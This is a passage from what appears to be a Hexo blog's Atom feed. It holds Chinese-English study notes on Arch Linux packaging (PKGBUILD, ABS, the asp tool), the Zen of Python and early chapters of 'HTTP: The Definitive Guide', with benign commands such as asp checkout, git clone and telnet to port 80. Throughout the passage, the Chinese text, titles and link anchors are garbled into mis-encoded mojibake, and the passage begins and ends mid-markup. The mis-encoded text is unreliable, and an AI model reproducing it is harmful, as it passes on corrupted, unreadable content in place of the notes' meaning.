    <content type="html"><![CDATA[<p>å°†å›¾ç‰‡æ”¾å…¥ <code>source/img</code> æ–‡ä»¶ä¸­å¯åœ¨åšå®¢ä¸­æ­£å¸¸æ˜¾ç¤ºã€‚</p><p>å°†å›¾ç‰‡æ”¾å…¥ä¸åšæ–‡åŒåçš„æ–‡ä»¶å¤¹ä¸­å¯ä»¥åœ¨ <code>instant-markdown-d</code> ä¸­æ­£ç¡®æ˜¾ç¤º.</p>]]></content>
    
    
    <categories>
      
      <category>Hexo</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ArchWiki ä¸­ PKGBUILD éƒ¨åˆ†</title>
    <link href="/2022/08/30/ArchWiki-%E4%B8%AD-PKGBUILD-%E9%83%A8%E5%88%86/"/>
    <url>/2022/08/30/ArchWiki-%E4%B8%AD-PKGBUILD-%E9%83%A8%E5%88%86/</url>
    
    <content type="html"><![CDATA[<p><a href="https://wiki.archlinux.org/title/PKGBUILD">æ–‡ç« ä½ç½®</a><br>A <code>PKGBUILD</code> is a shell script (ä¹Ÿå°±æ˜¯è¯´æ˜¯ä¸€ä¸ª shell è„šæœ¬æ–‡ä»¶ï¼Œåº”è¯¥å’Œ Makefile ç±»ä¼¼) containing the build information required by Arch Linux packages.</p><p>Arch Linux ç”¨ <code>makepkg</code> åˆ›å»ºè½¯ä»¶åŒ…ã€‚</p><p>å½“ <code>makepkg</code> è¿è¡Œæ—¶ï¼Œå®ƒä¼šåœ¨å½“å‰ç›®å½•å¯»æ‰¾ <code>PKGBUILD</code> æ–‡ä»¶ï¼Œå¹¶ä¾ç…§å…¶ä¸­çš„æŒ‡ä»¤ç¼–è¯‘æˆ–è·å–æ‰€éœ€çš„ä¾èµ–æ–‡ä»¶ï¼Œå¹¶ç”Ÿæˆ <code>pkgname.pkg.tar.xz</code> è½¯ä»¶åŒ…ã€‚ç”Ÿæˆçš„åŒ…å†…æœ‰äºŒè¿›åˆ¶æ–‡ä»¶å’Œå®‰è£…æŒ‡ä»¤ï¼Œå¯ä»¥ä½¿ç”¨ <code>pacman</code> è¿›è¡Œå®‰è£…ã€‚</p><p>å¯ä½¿ç”¨ <code>namcap</code> æ¥æ£€æŸ¥ <code>PKGBUILD</code> æ–‡ä»¶ä¸­çš„å¸¸è§æ‰“åŒ…é”™è¯¯ã€‚</p><p><code>pkgname</code>, <code>pkgver</code>, <code>pkgrel</code> å’Œ <code>arch</code> æ˜¯ <code>PKGBUILD</code> æ–‡ä»¶å¿…é¡»åŒ…å«çš„å˜é‡ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>asp å·¥å…·ç›¸å…³</title>
    <link href="/2022/08/30/asp-%E5%B7%A5%E5%85%B7%E7%9B%B8%E5%85%B3/"/>
    <url>/2022/08/30/asp-%E5%B7%A5%E5%85%B7%E7%9B%B8%E5%85%B3/</url>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/archlinux/asp">ä¸»é¡µ</a><br><code>asp</code> is a tool to manage the build source files used to create Arch Linux packages. </p><p><code>asp</code> æ›¿ä»£äº† <code>abs</code>, å…¶æä¾›äº†æ›´å¤šçš„ date sources, ä½¿ç”¨ä¸€ä¸ª sparse checkout model æ¥ç»´æŠ¤ diskspace.</p><h1 id="ä½¿ç”¨-asp"><a href="#ä½¿ç”¨-asp" class="headerlink" title="ä½¿ç”¨ asp"></a>ä½¿ç”¨ asp</h1><p>To clone the svntogit-repository for a specific package, use:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>asp checkout pkgname<br></code></pre></td></tr></table></figure><p>è¿™ä¼šæŠŠä¸€ä¸ª git repository for the given package å…‹éš†åˆ°ä¸€ä¸ªç›®å½• named like the package.</p><p>å»æ›´æ–°è¿™ä¸ª git repository, å¯ä»¥ <code>asp update</code> followed by <code>git pull</code> inside the git repository.</p><p>å¦‚æœè¦ copy ä¸€ä¸ªå¿«ç…§ of the current PKGBUILD for ä¸€ä¸ªç‰¹æŒ‡çš„ package, use:</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elm">$ asp ex<span class="hljs-keyword">port</span> pkgname<br></code></pre></td></tr></table></figure><h1 id="ç›´æ¥ä½¿ç”¨-git"><a href="#ç›´æ¥ä½¿ç”¨-git" class="headerlink" title="ç›´æ¥ä½¿ç”¨ git"></a>ç›´æ¥ä½¿ç”¨ git</h1><p>clone ä¸€ä¸ªç‰¹æŒ‡çš„ branch:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git <span class="hljs-built_in">clone</span> --branch branch/package --single-branch https://github.com/archlinux/svntogit-packages.git</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>é˜…è¯» ArchWiki ä¸­ Arch Linux éƒ¨åˆ†</title>
    <link href="/2022/08/30/%E9%98%85%E8%AF%BB-ArchWiki-%E4%B8%AD-Arch-Linux-%E9%83%A8%E5%88%86/"/>
    <url>/2022/08/30/%E9%98%85%E8%AF%BB-ArchWiki-%E4%B8%AD-Arch-Linux-%E9%83%A8%E5%88%86/</url>
    
    <content type="html"><![CDATA[<p><a href="https://wiki.archlinux.org/">ArchWiki</a><br>Arch Linux æ›´ä¸ºç®€æ´ï¼Œä¸€å¼€å§‹çš„å†…å®¹å¾ˆå°‘ï¼Œå‡ ä¹æ‰€æœ‰é…ç½®éƒ½éœ€è¦è‡ªå·±æ·»åŠ ã€‚</p><p>å…¶åŸºäºæ»šåŠ¨å‘è¡Œ (rolling-releasel).</p><p>ä¸€å¼€å§‹åªæœ‰ commandline ç•Œé¢ã€‚</p><p>arch çš„åŒ…ç®¡ç†å™¨ä¸º pacman.</p><h1 id="About-Arch-Build-System"><a href="#About-Arch-Build-System" class="headerlink" title="About Arch Build System"></a>About Arch Build System</h1><p>The Arch build system is a port-like system for building and packaging software from source code.</p><p><mark>pacman</mark> is the specialized Arch tool for binary package management.</p><p><mark>ABS</mark>(Arch Build System) is a collection of tools for compiling source into installable <code>.pkg.tar.zst</code> packages.</p><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p><code>ABS</code> åŒ…å«ä»¥ä¸‹å·¥å…·ä½œä¸º a complete toolkit:</p><ul><li>Repository tree, æ˜¯ repository çš„æ–‡ä»¶ç»“æ„</li><li>PKGBUILD, æ˜¯ä¸€ä¸ª bash script</li><li>makepkg, a shell command tool which reads PKGBUILDs, automatically downloads and compiles the sources and creates a <code>.pkg.tar*</code> according to the <code>PKGEXT</code> array in <code>makepkg.conf</code></li><li>pacman, to install and remove the build packages and for fetching dependencies.</li><li>AUR (The Arch User Repository)</li></ul><h2 id="Repository-tree"><a href="#Repository-tree" class="headerlink" title="Repository tree"></a>Repository tree</h2><p>ä¸€ä¸ªåŒ…ï¼Œå‡å¦‚ä¸º <code>acl</code>, å…¶ tree å¤§æ¦‚ä¸º:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">acl <br>acl/repos<br>acl<span class="hljs-regexp">/repos/</span>core-x86_64<br>acl<span class="hljs-regexp">/repos/</span>core-x86_64/PKGBUILD<br>acl/trunk<br>acl<span class="hljs-regexp">/trunk/</span>PKGBUILD<br>acl<br></code></pre></td></tr></table></figure><p><code>repos</code> ç›®å½•ä¸­ä¸ºå®˜æ–¹å‘å¸ƒçš„ï¼Œ<code>truck</code> ç›®å½•æ˜¯è¿˜æ²¡æœ‰å‘å¸ƒåˆ° <code>repos</code> ä¸­çš„ã€‚</p><p>çœŸæ­£çš„æºç ä¸ä¼šå­˜åœ¨äº ABS directory ä¸­, <code>PKGBUILD</code> é‡Œé¢åŒ…å«äº†ä¸€ä¸ª URL, that will download the source code when the package is built.</p><h3 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h3><h4 id="Retrieve-PKGBUILD-source"><a href="#Retrieve-PKGBUILD-source" class="headerlink" title="Retrieve PKGBUILD source"></a>Retrieve PKGBUILD source</h4><p>ä¸ºäº†å¾—åˆ° PKGBUILD file éœ€è¦æ„å»ºä¸€ä¸ªå…·ä½“çš„ package from source, å¯ä»¥ä½¿ç”¨ <code>SVN</code> æˆ–è€… <code>GIT</code>.</p><p>å…ˆå†³æ¡ä»¶æ˜¯ install the <code>asp</code> package.</p><p>Asp æ˜¯ä¸€ä¸ªå·¥å…·ï¼Œç”¨äºä½¿ç”¨ GIT æ¥è·å– the build source file for Arch Linux packages.</p>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Python ä¹‹ç¦…</title>
    <link href="/2022/08/29/Python-%E4%B9%8B%E7%A6%85/"/>
    <url>/2022/08/29/Python-%E4%B9%8B%E7%A6%85/</url>
    
    <content type="html"><![CDATA[<p>åœ¨äº¤äº’ç•Œé¢ä¸­è¾“å…¥ <code>import this</code> å¯ä»¥çœ‹åˆ°.</p>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>HTTP æƒå¨æŒ‡å— Notes</title>
    <link href="/2022/08/29/HTTP-%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-Notes/"/>
    <url>/2022/08/29/HTTP-%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-Notes/</url>
    
    <content type="html"><![CDATA[<p><a href="http://www.joes-hardware.com/">Joeçš„äº”é‡‘å•†åº—</a></p><h1 id="ç¬¬ä¸€éƒ¨åˆ†-HTTP-Web-çš„åŸºç¡€"><a href="#ç¬¬ä¸€éƒ¨åˆ†-HTTP-Web-çš„åŸºç¡€" class="headerlink" title="ç¬¬ä¸€éƒ¨åˆ† HTTP: Web çš„åŸºç¡€"></a>ç¬¬ä¸€éƒ¨åˆ† HTTP: Web çš„åŸºç¡€</h1><h2 id="ç¬¬ä¸€ç« -HTTP-æ¦‚è¿°"><a href="#ç¬¬ä¸€ç« -HTTP-æ¦‚è¿°" class="headerlink" title="ç¬¬ä¸€ç«  HTTP æ¦‚è¿°"></a>ç¬¬ä¸€ç«  HTTP æ¦‚è¿°</h2><h3 id="1-1-HTTP-â€“-å› ç‰¹ç½‘çš„å¤šåª’ä½“ä¿¡ä½¿"><a href="#1-1-HTTP-â€“-å› ç‰¹ç½‘çš„å¤šåª’ä½“ä¿¡ä½¿" class="headerlink" title="1.1 HTTP â€“ å› ç‰¹ç½‘çš„å¤šåª’ä½“ä¿¡ä½¿"></a>1.1 HTTP â€“ å› ç‰¹ç½‘çš„å¤šåª’ä½“ä¿¡ä½¿</h3><p>HTTP (Hypertext Transfer  Protocol, è¶…æ–‡æœ¬ä¼ è¾“åè®®).</p><h3 id="1-2-Web-å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨"><a href="#1-2-Web-å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨" class="headerlink" title="1.2 Web å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨"></a>1.2 Web å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨</h3><p>HTTP å®¢æˆ·ç«¯å’Œ HTTP æœåŠ¡å™¨å…±åŒæ„æˆäº†ä¸‡ç»´ç½‘çš„åŸºæœ¬ç»„ä»¶ã€‚</p><h3 id="1-3-èµ„æº"><a href="#1-3-èµ„æº" class="headerlink" title="1.3 èµ„æº"></a>1.3 èµ„æº</h3><p>Web resource åœ¨ Web server ä¸­ã€‚</p><h4 id="1-3-1-åª’ä½“ç±»å‹"><a href="#1-3-1-åª’ä½“ç±»å‹" class="headerlink" title="1.3.1 åª’ä½“ç±»å‹"></a>1.3.1 åª’ä½“ç±»å‹</h4><p>MIME (Multipurpose Internet Mail Extension, å¤šç”¨é€”å› ç‰¹ç½‘é‚®ä»¶æ‰©å±•) ç±»å‹ç”¨æ¥æè¿°å¹¶æ ‡è®°å¤šåª’ä½“å†…å®¹.</p><p>Web æœåŠ¡å™¨ä¼šä¸ºæ‰€æœ‰ HTTP å¯¹è±¡æ•°æ®é™„åŠ ä¸€ä¸ª MIME ç±»å‹ã€‚</p><p>MIME ç±»å‹æ˜¯ä¸€ç§æ–‡æœ¬æ ‡è®°ï¼Œè¡¨ç¤ºä¸€ç§ä¸»è¦çš„å¯¹è±¡ç±»å‹å’Œä¸€ä¸ªç‰¹å®šçš„å­ç±»å‹ï¼Œä¸­é—´ç”±ä¸€æ¡æ–œæ åˆ†éš”ï¼Œå¦‚:</p><ul><li>HTML æ ¼å¼çš„æ–‡æœ¬æ–‡æ¡£ç”± text&#x2F;html ç±»å‹æ¥æ ‡è®°<br>ç”±æ­¤å¯è§ï¼ŒMIME ç±»å‹ä¸æ˜¯ç‰¹æŒ‡ä¸€ç§ç±»å‹.</li></ul><h4 id="1-3-2-URI"><a href="#1-3-2-URI" class="headerlink" title="1.3.2 URI"></a>1.3.2 URI</h4><p>URI (Uniform Resource Identifier, ç»Ÿä¸€èµ„æºæ ‡è¯†ç¬¦). å”¯ä¸€æ ‡è¯†å¹¶å®šä½ä¿¡æ¯èµ„æº.</p><p>URI æœ‰ä¸¤ç§å½¢å¼:</p><ul><li>URL</li><li>URN</li></ul><h4 id="1-3-3-URL"><a href="#1-3-3-URL" class="headerlink" title="1.3.3 URL"></a>1.3.3 URL</h4><p>URL (Uniform Resource Locator), æè¿°ä¸€å°ç‰¹å®šæœåŠ¡å™¨ä¸ŠæŸèµ„æºçš„ç‰¹å®šä½ç½®.</p><p>URL å¤§éƒ½éµå¾ªä¸€ç§æ ‡å‡†æ ¼å¼ï¼Œå…¶åŒ…å«ä¸‰ä¸ªéƒ¨åˆ†:</p><ol><li>æ–¹æ¡ˆ (scheme), å³åè®®ç±»å‹, å¦‚: <code>http://</code></li><li>æœåŠ¡å™¨çš„å› ç‰¹ç½‘åœ°å€ï¼Œå¦‚: <code>www.joes-hardware.com</code></li><li>å…¶ä½™éƒ¨åˆ†æŒ‡å®š Web æœåŠ¡å™¨ä¸Šçš„æŸä¸ªèµ„æºï¼Œå¦‚: <code>/specials/saw-blade.gif</code></li></ol><h4 id="1-3-4-URN"><a href="#1-3-4-URN" class="headerlink" title="1.3.4 URN"></a>1.3.4 URN</h4><p>URN (Uniform Resource Name), ä¸ç›®å‰çš„èµ„æºæ‰€åœ¨åœ°æ— å…³ï¼Œå…¶ä½œä¸ºç‰¹å®šå†…å®¹çš„å”¯ä¸€åç§°ä½¿ç”¨ã€‚å¦‚: <code>urn:ietf:rfc:2141</code></p><p>è¿™ç§æ¡†æ¶å¯ä»¥åœ¨å¯¹è±¡ä»ä¸€å¤„æ¬ç§»åˆ°å¦ä¸€å¤„æ—¶ï¼Œä¿æŒç¨³å®šçš„è®¿é—®åç§°ã€‚</p><h3 id="1-4-äº‹åŠ¡"><a href="#1-4-äº‹åŠ¡" class="headerlink" title="1.4 äº‹åŠ¡"></a>1.4 äº‹åŠ¡</h3><p>ä¸€ä¸ª HTTP äº‹åŠ¡ç”±ä¸€æ¡è¯·æ±‚å‘½ä»¤å’Œä¸€ä¸ªå“åº”ç»“æœç»„æˆï¼Œè¿™ç§é€šä¿¡æ˜¯é€šè¿‡åä¸º HTTP æŠ¥æ–‡ (HTTP message) çš„æ ¼å¼åŒ–æ•°æ®å—è¿›è¡Œçš„ã€‚</p><h4 id="1-4-1-æ–¹æ³•"><a href="#1-4-1-æ–¹æ³•" class="headerlink" title="1.4.1 æ–¹æ³•"></a>1.4.1 æ–¹æ³•</h4><p>HTTP æ”¯å‡ºå‡ ç§ä¸åŒçš„è¯·æ±‚å‘½ä»¤ï¼Œè¿™äº›å‘½ä»¤è¢«ç§°ä¸º HTTP æ–¹æ³• (HTTP method). æ¯æ¡ HTTP è¯·æ±‚æŠ¥æ–‡éƒ½åŒ…å«ä¸€ä¸ªæ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•ä¼šå‘Šè¯‰æœåŠ¡å™¨è¦æ‰§è¡Œä»€ä¹ˆåŠ¨ä½œã€‚</p><p>5ç§å¸¸è§çš„ HTTP æ–¹æ³•:</p><ul><li>GET, ä»æœåŠ¡å™¨å‘å®¢æˆ·ç«¯å‘é€å‘½åèµ„æº</li><li>PUTï¼Œå°†æ¥è‡ªå®¢æˆ·ç«¯çš„æ•°æ®å­˜å‚¨åˆ°ä¸€ä¸ªå‘½åçš„æœåŠ¡å™¨èµ„æºä¸­</li><li>DELETE, ä»æœåŠ¡å™¨åˆ é™¤å‘½åèµ„æº</li><li>POST, å°†å®¢æˆ·ç«¯æ•°æ®å‘é€åˆ°ä¸€ä¸ªæœåŠ¡å™¨ç½‘å…³åº”ç”¨ç¨‹åº</li><li>HEAD, ä»…å‘é€å‘½åèµ„æºå“åº”ä¸­çš„ HTTP é¦–éƒ¨</li></ul><h4 id="1-4-2-çŠ¶æ€ç "><a href="#1-4-2-çŠ¶æ€ç " class="headerlink" title="1.4.2 çŠ¶æ€ç "></a>1.4.2 çŠ¶æ€ç </h4><p>æ¯æ¡ HTTP å“åº”æŠ¥æ–‡è¿”å›æ—¶éƒ½ä¼šæºå¸¦ä¸€ä¸ªçŠ¶æ€ç ï¼ŒçŠ¶æ€ç æ˜¯ä¸€ä¸ªä¸‰ä½æ•°å­—çš„ä»£ç ã€‚</p><p>å‡ ç§å¸¸è§çš„çŠ¶æ€ç :</p><ul><li>200, OK, æ–‡æ¡£æ­£ç¡®è¿”å›</li><li>302ï¼ŒRedirect, åˆ°å…¶ä»–åœ°æ–¹è·å–èµ„æº</li><li>404, Not Found, æ— æ³•æ‰¾åˆ°èµ„æº</li></ul><h4 id="1-4-3-Web-é¡µé¢ä¸­å¯ä»¥åŒ…å«å¤šä¸ªå¯¹è±¡"><a href="#1-4-3-Web-é¡µé¢ä¸­å¯ä»¥åŒ…å«å¤šä¸ªå¯¹è±¡" class="headerlink" title="1.4.3 Web é¡µé¢ä¸­å¯ä»¥åŒ…å«å¤šä¸ªå¯¹è±¡"></a>1.4.3 Web é¡µé¢ä¸­å¯ä»¥åŒ…å«å¤šä¸ªå¯¹è±¡</h4><h3 id="1-5-æŠ¥æ–‡"><a href="#1-5-æŠ¥æ–‡" class="headerlink" title="1.5 æŠ¥æ–‡"></a>1.5 æŠ¥æ–‡</h3><p>ä» Web å®¢æˆ·ç«¯å‘å¾€ Web æœåŠ¡å™¨çš„ HTTP æŠ¥æ–‡ç§°ä¸ºè¯·æ±‚æŠ¥æ–‡ (request message), ä»æœåŠ¡å™¨å‘å¾€å®¢æˆ·ç«¯çš„æŠ¥æ–‡ç§°ä¸ºå“åº”æŠ¥æ–‡ (response message).</p><p>å…¶åŒ…å«ä¸‰ä¸ªéƒ¨åˆ†:</p><ul><li>èµ·å§‹è¡Œ</li><li>é¦–éƒ¨å­—æ®µ, æ¯ä¸ªé¦–éƒ¨å­—æ®µéƒ½åŒ…å«ä¸€ä¸ªåå­—å’Œä¸€ä¸ªå€¼ï¼Œå…¶ç”¨ <code>:</code> åˆ†éš”</li><li>ä¸»ä½“, å¯åŒ…å«äºŒè¿›åˆ¶æ•°æ®</li></ul><h3 id="1-6-è¿æ¥"><a href="#1-6-è¿æ¥" class="headerlink" title="1.6 è¿æ¥"></a>1.6 è¿æ¥</h3><h4 id="1-6-1-TCP-x2F-IP"><a href="#1-6-1-TCP-x2F-IP" class="headerlink" title="1.6.1 TCP&#x2F;IP"></a>1.6.1 TCP&#x2F;IP</h4><p>HTTP åè®®ä½äº TCP çš„ä¸Šå±‚ï¼ŒHTTP ä½¿ç”¨ TCP æ¥ä¼ è¾“å…¶æŠ¥æ–‡æ•°æ®. TCP ä½äº IP ä¸Šå±‚ã€‚<br><img src="/HTTP-%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-Notes/%E5%88%86%E5%B1%82.png" alt="åˆ†å±‚"></p><h4 id="1-6-2-è¿æ¥ã€IP-åœ°å€åŠç«¯å£å·"><a href="#1-6-2-è¿æ¥ã€IP-åœ°å€åŠç«¯å£å·" class="headerlink" title="1.6.2 è¿æ¥ã€IP åœ°å€åŠç«¯å£å·"></a>1.6.2 è¿æ¥ã€IP åœ°å€åŠç«¯å£å·</h4><p>åœ¨ HTTP å®¢æˆ·ç«¯å‘æœåŠ¡å™¨å‘é€æŠ¥æ–‡ä¹‹å‰ï¼Œéœ€è¦ç”¨ç½‘é™…åè®® (Internet Protocol, IP) åœ°å€å’Œç«¯å£å·åœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´å»ºç«‹ä¸€æ¡ TCP&#x2F;IP è¿æ¥ã€‚</p><p>URL ä¸­æ²¡æœ‰ç«¯å£å·ï¼Œå¯ä»¥å‡è®¾å…¶æœ‰é»˜è®¤ç«¯å£å·ã€‚</p><h4 id="1-6-3-ä¸€ä¸ªä½¿ç”¨-Telnet-çš„å®ä¾‹"><a href="#1-6-3-ä¸€ä¸ªä½¿ç”¨-Telnet-çš„å®ä¾‹" class="headerlink" title="1.6.3 ä¸€ä¸ªä½¿ç”¨ Telnet çš„å®ä¾‹"></a>1.6.3 ä¸€ä¸ªä½¿ç”¨ Telnet çš„å®ä¾‹</h4><p>Telnet ç¨‹åºå¯ä»¥å°†é”®ç›˜è¿æ¥åˆ°æŸä¸ªç›®æ ‡ TCP ç«¯å£ï¼Œå¹¶å°†æ­¤ TCP ç«¯å£çš„è¾“å‡ºå›é€åˆ°æ˜¾ç¤ºå±ä¸Š.</p><p>Telent å¸¸ç”¨äºè¿œç¨‹ç»ˆç«¯ä¼šè¯ï¼Œå…¶å‡ ä¹å¯ä»¥è¿æ¥æ‰€æœ‰çš„ TCP æœåŠ¡å™¨ã€‚</p><p>ä½¿ç”¨ <code>telnet</code> ç¨‹åº:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">$ telnet www<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span> <span class="hljs-number">80</span><br></code></pre></td></tr></table></figure><p>å…¶ä¼šè¾“å‡ºä¸‰è¡Œå†…å®¹è¡¨ç¤ºå·²ç»å»ºç«‹å¥½äº†è¿æ¥ï¼Œæ­¤æ—¶æˆ‘ä»¬å¯ä»¥è¾“å…¥è¯·æ±‚å‘½ä»¤å¦‚:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span>/tools.html HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>nc ç¨‹åºå¯ä»¥æ–¹ä¾¿åœ°æ“çºµåŸºäº UDP å’Œ TCP çš„æµé‡.</p><h3 id="1-7-åè®®ç‰ˆæœ¬"><a href="#1-7-åè®®ç‰ˆæœ¬" class="headerlink" title="1.7 åè®®ç‰ˆæœ¬"></a>1.7 åè®®ç‰ˆæœ¬</h3><p>ç›®å‰ä»ä½¿ç”¨çš„ç‰ˆæœ¬:</p><ul><li>HTTP&#x2F;0.9</li><li>HTTP&#x2F;1.0</li><li>HTTP&#x2F;1.0+</li><li>HTTP&#x2F;1.1</li><li>HTTP&#x2F;2.0</li></ul><h3 id="1-8-Web-çš„ç»“æ„ç»„ä»¶"><a href="#1-8-Web-çš„ç»“æ„ç»„ä»¶" class="headerlink" title="1.8 Web çš„ç»“æ„ç»„ä»¶"></a>1.8 Web çš„ç»“æ„ç»„ä»¶</h3><p>è¾ƒä¸ºé‡è¦çš„åº”ç”¨ç¨‹åº:</p><ul><li>ä»£ç†, ä½äºå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´çš„ HTTP ä¸­é—´å®ä½“</li><li>ç¼“å­˜, HTTP ä»“åº“ï¼Œä½¿å¸¸ç”¨é¡µé¢çš„å‰¯æœ¬å¯ä»¥ä¿å­˜åœ¨ç¦»å®¢æˆ·ç«¯æ›´è¿‘çš„åœ°æ–¹</li><li>ç½‘å…³, è¿æ¥å…¶ä»–åº”ç”¨ç¨‹åºçš„ç‰¹æ®Šçš„ Web æœåŠ¡å™¨</li><li>éš§é“, å¯¹ HTTP é€šä¿¡æŠ¥æ–‡è¿›è¡Œç›²è½¬å‘çš„ç‰¹æ®Šä»£ç†</li><li>Agent ä»£ç†, å‘èµ·è‡ªåŠ¨ HTTP è¯·æ±‚çš„åŠæ™ºèƒ½ Web å®¢æˆ·ç«¯</li></ul><h4 id="1-8-1-ä»£ç†"><a href="#1-8-1-ä»£ç†" class="headerlink" title="1.8.1 ä»£ç†"></a>1.8.1 ä»£ç†</h4><p>ä»£ç†è¿˜å¯ä»¥å¯¹è¯·æ±‚å’Œå“åº”è¿›è¡Œè¿‡æ»¤ã€‚</p><h4 id="1-8-2-ç¼“å­˜"><a href="#1-8-2-ç¼“å­˜" class="headerlink" title="1.8.2 ç¼“å­˜"></a>1.8.2 ç¼“å­˜</h4><p>å®¢æˆ·ç«¯ä»é™„è¿‘ç¼“å­˜ä¸‹è½½æ–‡æ¡£ä¼šæ¯”ä»è¿œç¨‹ Web æœåŠ¡å™¨ä¸‹è½½å¿«å¾—å¤š.</p><h4 id="1-8-3-ç½‘å…³"><a href="#1-8-3-ç½‘å…³" class="headerlink" title="1.8.3 ç½‘å…³"></a>1.8.3 ç½‘å…³</h4><p>gateway, ä½œä¸ºå…¶ä»–æœåŠ¡å™¨çš„ä¸­é—´å®ä½“ä½¿ç”¨ã€‚é€šå¸¸ç”¨äºå°† HTTP æµé‡è½¬æ¢æˆå…¶ä»–çš„åè®®.</p><h4 id="1-8-4-éš§é“"><a href="#1-8-4-éš§é“" class="headerlink" title="1.8.4 éš§é“"></a>1.8.4 éš§é“</h4><p>HTTP éš§é“çš„ä¸€ç§å¸¸è§ç”¨é€”æ˜¯é€šè¿‡ HTTP è¿æ¥æ‰¿è½½åŠ å¯†çš„å®‰å…¨å¥—æ¥å­—å±‚ (SSL, Secure Socket Layer) æµé‡ï¼Œä½¿å…¶å¯ä»¥ç©¿è¿‡åªå…è®¸ Web æµé‡é€šè¿‡çš„é˜²ç«å¢™ã€‚</p><h4 id="1-8-5-Agent-ä»£ç†"><a href="#1-8-5-Agent-ä»£ç†" class="headerlink" title="1.8.5 Agent ä»£ç†"></a>1.8.5 Agent ä»£ç†</h4><p>æ˜¯ä»£è¡¨å®¢æˆ·å‘èµ· HTTP è¯·æ±‚çš„å®¢æˆ·ç«¯ç¨‹åºã€‚</p><p>æ‰€æœ‰å‘å¸ƒ Web è¯·æ±‚çš„åº”ç”¨ç¨‹åºéƒ½æ˜¯ HTTP Agent ä»£ç†.</p><h2 id="ç¬¬äºŒç« -URL-ä¸èµ„æº"><a href="#ç¬¬äºŒç« -URL-ä¸èµ„æº" class="headerlink" title="ç¬¬äºŒç«  URL ä¸èµ„æº"></a>ç¬¬äºŒç«  URL ä¸èµ„æº</h2><h3 id="2-1-æµè§ˆå› ç‰¹ç½‘èµ„æº"><a href="#2-1-æµè§ˆå› ç‰¹ç½‘èµ„æº" class="headerlink" title="2.1 æµè§ˆå› ç‰¹ç½‘èµ„æº"></a>2.1 æµè§ˆå› ç‰¹ç½‘èµ„æº</h3><p>URL ä¸ºåº”ç”¨ç¨‹åºæä¾›äº†ä¸€ç§è®¿é—®èµ„æºçš„æ‰‹æ®µã€‚</p><h3 id="2-2-URL-çš„è¯­æ³•"><a href="#2-2-URL-çš„è¯­æ³•" class="headerlink" title="2.2 URL çš„è¯­æ³•"></a>2.2 URL çš„è¯­æ³•</h3><p>URL è¯­æ³•ä¼šéšæ–¹æ¡ˆçš„ä¸åŒè€Œæœ‰æ‰€ä¸åŒ.</p><p>å¤§éƒ¨åˆ† URL éƒ½éµå¾ªé€šç”¨çš„ URL è¯­æ³•ï¼Œè€Œä¸”ä¸åŒ URL æ–¹æ¡ˆçš„é£æ ¼å’Œè¯­æ³•éƒ½æœ‰ä¸å°‘é‡å ã€‚</p><p>æµè§ˆå™¨é€šå¸¸ä¼šç”¨å…¶ä»–åº”ç”¨ç¨‹åºæ¥å¤„ç†ç‰¹æ®Šçš„èµ„æº.</p><p>ç”±9éƒ¨åˆ†æ„æˆçš„é€šç”¨æ ¼å¼:</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">&lt;scheme&gt;<span class="hljs-symbol">://&lt;user&gt;</span><span class="hljs-symbol">:&lt;password&gt;</span>@&lt;host&gt;<span class="hljs-symbol">:&lt;port&gt;/&lt;path&gt;</span>;&lt;params&gt;<span class="hljs-string">?&lt;</span>query&gt;#&lt;frag&gt;<br></code></pre></td></tr></table></figure><p>è§£é‡Š:<br><img src="/HTTP-%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-Notes/URL%E7%BB%84%E4%BB%B6.png" alt="URLç»„ä»¶"><br><img src="/../img/URL%E7%BB%84%E4%BB%B6.png" alt="URLç»„ä»¶"></p><h4 id="2-2-1-æ–¹æ¡ˆ-â€“-ä½¿ç”¨ä»€ä¹ˆåè®®"><a href="#2-2-1-æ–¹æ¡ˆ-â€“-ä½¿ç”¨ä»€ä¹ˆåè®®" class="headerlink" title="2.2.1 æ–¹æ¡ˆ â€“ ä½¿ç”¨ä»€ä¹ˆåè®®"></a>2.2.1 